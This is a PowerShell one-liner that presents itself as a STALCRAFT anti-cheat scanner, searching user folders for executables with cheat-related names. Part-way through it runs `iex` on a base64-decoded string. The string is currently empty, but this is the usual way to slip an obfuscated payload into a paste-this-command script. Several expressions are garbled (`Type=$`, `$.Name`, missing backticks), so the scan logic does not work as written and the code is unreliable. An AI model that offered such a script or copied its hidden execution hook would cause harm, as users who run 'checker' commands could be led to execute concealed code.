$s=@("cheat","hack","trainer","injector","aimbot","esp","stalcraft","wallhack","bypass","crack");$l=@("$env:USERPROFILE\Downloads","$env:USERPROFILE\Desktop","$env:APPDATA","$env:LOCALAPPDATA\Temp","$env:TEMP");$t=@();$e=@();iex ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('')));Write-Host "STALCRAFT SCAN - $(Get-Date -Format 'HH:mm:ss')" -f Cyan;Write-Host "n";foreach($loc in $l){if(Test-Path $loc){Write-Host "Scanning: $loc" -f Gray;$files=Get-ChildItem $loc -Filter .exe -Recurse -Depth 1 -ErrorAction 0;$files|%{if($loc -match 'Temp'){$e+=[PSCustomObject]@{File=$_.Name;Path=$_.FullName}};$s|%{if($_.Name -like "$*"){$t+=[PSCustomObject]@{Type=$;File=$.Name;Folder=$_.Directory}}}}}};if($t.Count -gt 0){Write-Host "nCHEATS DETECTED:" -f Red;$t|ft Type,File,Folder -AutoSize}else{Write-Host "nNo cheats found" -f Green};if($e.Count -gt 0){Write-Host "nTEMP EXE FILES:" -f Yellow;$e|select -First 5|ft File,@{N="Path";E={if($_.Path.Length -gt 40){$_.Path.Substring(0,40)+"..."}else{$_.Path}}} -AutoSize}
